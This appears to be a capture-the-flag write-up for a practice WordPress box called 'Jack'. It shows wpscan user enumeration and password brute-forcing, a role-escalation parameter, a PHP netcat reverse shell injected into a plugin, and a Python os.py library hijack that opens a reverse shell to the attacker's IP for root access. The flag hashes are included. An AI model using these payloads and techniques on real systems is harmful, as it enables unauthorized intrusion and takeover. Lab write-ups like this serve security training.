# Jack 

> VOiD | Sunday 08 August 2021 10:07:21 PM IST

My IP : 10.17.6.109
Target IP : 


# PORT 80
JACK IS VISITING OVERLOOK HOTEL IN COLORADO FOR SOME INSPIRATION.

users
```bash
[+] jack
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://jack.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] wendy
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] danny
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

wpscan --url http://jack.thm/ --usernames wendy -P /usr/share/wordlists/fasttrack.txt | tee wpsc3
[!] Valid Combinations Found:
 | Username: wendy, Password: changelater

msfconsole : exploit/unix/webapp/wp_admin_shell_upload

change wendy user permisions using burpsuite and add between parameter passed: ure_other_roles=administrator



```

Reverse shell
It was not possible to hook the 404.php template with a PHP reverse shell but but updating the plugins is possible.

Prefix the existing code of any plugin (e.g. Hello Dolly > hello.php) with a reverse shell, as shown below:
```php

<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.6.109 4444 >/tmp/f'); ?>
```
Save the page, open a listener (rlwrap nc -nlvp 4444) and activate the plugin. It should trigger a shell:

user www-date
```bash
cat reminder.txt 

Please read the memo on linux file permissions, last time your backups almost got us hacked! Jack will hear about this when he gets back.

/var/backups/id_rsa is readable
```

user jack
```bash
cat user.txt 
0052f7829e48752f2e7bf50f1231548a

./pspy

2020/06/18 09:54:01 CMD: UID=0    PID=27142  | /bin/sh -c /usr/bin/python /opt/statuscheck/checker.py 

nano os.py
import socket
import pty
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.17.6.109",8888))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/bash")
```

user root
```bash
cat root.txt 
b8b63a861cc09e853f29d8055d64bffb


```
